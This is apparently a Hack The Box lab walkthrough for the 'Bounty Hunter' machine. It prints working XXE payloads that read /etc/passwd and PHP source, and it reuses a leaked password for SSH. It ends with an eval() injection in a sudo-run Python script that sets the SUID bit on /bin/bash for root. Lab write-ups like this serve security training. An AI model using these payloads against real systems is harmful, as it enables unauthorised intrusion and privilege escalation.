---
title: "Bounty Hunter"
description: "Hack The Box walkthrough covering XXE exploitation, PHP wrappers, credential reuse, eval() injection and Linux privilege escalation."
published: 2026-09-29
platform: "Hack The Box"
category: "Linux"
difficulty: "Medium"
os: "Linux"
tags:
- XML based log submission
- XXE Local File Include
- XXE PHP Wrappers
- Credential Reuse
- sudo -l
- eval() injection
- suid /bin/bash
featured: true
homepage: true
draft: false
---

## Initial Recon

Network Mapping:

```
nmap -p22,80 -sVC -vvv -oN nmap/service 10.129.95.166
```
> Ports open: TCP/22, TCP/80


Services:

- OpenSSH 8.2p1 Ubuntu
- Apache httpd 2.4.41 ((Ubuntu))

Directories:

- log_submit.php
- portal.php
- db.php - blank page


Log Submission

```
POST /tracker_diRbPr00f314.php HTTP/1.1
Host: 10.129.95.166
Content-Length: 207
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: http://10.129.95.166
Referer: http://10.129.95.166/log_submit.php
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

data=PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KCQk8YnVncmVwb3J0PgoJCTx0aXRsZT4xPC90aXRsZT4KCQk8Y3dlPjI8L2N3ZT4KCQk8Y3Zzcz4zPC9jdnNzPgoJCTxyZXdhcmQ%2BNDwvcmV3YXJkPgoJCTwvYnVncmVwb3J0Pg%3D%3D
```

The data is url encoded and base64 encoded. If we url decode then base64 decode it shows us xml

```
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>1</title>
		<cwe>2</cwe>
		<cvss>3</cvss>
		<reward>4</reward>
		</bugreport>
```

## XXE

Attempt to try XXE to get access to /etc/passwd.

```
<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <bugreport>
        <title>&xxe;</title>
        <cwe>2</cwe>
        <cvss>3</cvss>
        <reward>4</reward>
        </bugreport>
```

Looking at the db.php file we couldnt see before, we can attempt to grab this, however to stop it from executing we want to use a php wrapper and base64 encode it.

```
<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=db.php"> ]>

        <bugreport>
        <title>&xxe;</title>
        <cwe>2</cwe>
        <cvss>3</cvss>
        <reward>4</reward>
        </bugreport>
```

---
## Developer

```
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
```

Looking at the credentials they look like they are for some database somewhere, although all weve seen are references to one needing to be setup.

Try credentials against known users, (/etc/passwd had Development user)

```
ssh development@10.129.95.166
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
development@10.129.95.166's password: m19RoAU0hP41A1sTsq6K
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
```

sudo -l

```
$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

Reviewing the [[ticketValidator.py]] there is some code that appears to intake a file and then check it matches criteria before running.

|Requirement|What the code checks|Explanation|
|---|---|---|
|File extension|`.endswith(".md")`|The supplied filename must end in `.md`.|
|First line|`# Skytrain Inc`|Line 0 must start with this exact string.|
|Second line|`## Ticket to`|Line 1 must start with this string. The destination itself is not validated.|
|Ticket-code marker|`__Ticket Code:__`|The code searches for this exact, case-sensitive marker anywhere after the first two lines.|
|Code position|Immediately after marker|`code_line = i + 1`, so the ticket code must be on the next line.|
|Code formatting|Starts with `**`|The code line must begin with two asterisks. It does not actually require a closing `**`.|
|First value|`int(ticketCode) % 7 == 4`|Everything before the first `+` is converted to an integer and must leave a remainder of `4` when divided by `7`.|
|`eval()` condition|Entire code expression is evaluated|After removing `**`, the complete expression is passed to Python's `eval()`. This is the critical injection point.|
|Validation result|`validationNumber > 100`|The result returned by `eval()` must be greater than `100` for the function to return `True`.|
For a normal ticket, the relevant structure is therefore:

```
# Skytrain Inc
## Ticket to <destination>
__Ticket Code:__
**<number>+<number>+<number>
```

For example, `11+321+1` passes the numeric checks because `11 % 7 == 4` and the expression evaluates to `333`.

## eval() Injection

The key security weakness is that the code only treats the first value as a number for the modulo check, but then passes the **entire ticket-code expression** to `eval()`. Consequently, the remainder of the line is not constrained to being a numeric value and can contain a Python expression. If the validator is executed through `sudo`, successful exploitation of that `eval()` occurs with the privileges of the sudo execution context.

The payload exploits the fact that the ticket code is passed directly to Python's `eval()` after only the first value has been checked. The payload is structured so that the first number satisfies the ticket requirement, while the remainder of the expression performs an additional Python operation.

For example:

```
**109+0 and __import__('os').system('...')
```

`109` is chosen because `109 % 7 == 4`, satisfying the validator's first check. `109+0` evaluates to a truthy value, so Python's `and` operator proceeds to evaluate the second expression. `__import__('os')` obtains Python's `os` module, and `.system()` executes an operating-system command. The important point is that the command executes **during `eval()`**, before the application checks whether the final result is greater than 100. Therefore, the ticket can ultimately be reported as invalid while the injected command has already executed.

In the privilege-escalation scenario, the vulnerable Python application is permitted through `sudo`, meaning the injected Python code inherits the privileges of the sudo execution context. The payload therefore turns the original `eval()` injection into command execution with elevated privileges.

```
$ cat /home/development/ticket.md
# Skytrain Inc 
## Ticket to New Haven 
__Ticket Code:__ 
**109+0 and __import__('os').system('chmod u+s /bin/bash')
```

## Privilege Escalation

Run the ticketValidator and enter your file path, it will run it and may come back invalid, but then check /bin/bash to see if it has the suid bit set. If so, try `bash -p` which runs bash in privleged mode.

```
development@bountyhunter:/opt/skytrain_inc/invalid_tickets$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py                                                                                                                    
Please enter the path to the ticket file.                  
/home/development/ticket.md
     
Destination: New Haven                                                             
Invalid ticket.

development@bountyhunter:/opt/skytrain_inc/invalid_tickets$ ls -la /bin/bash                                          
-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash 

development@bountyhunter:/opt/skytrain_inc/invalid_tickets$ bash -p                                                   
bash-5.0# whoami                                 
root 
```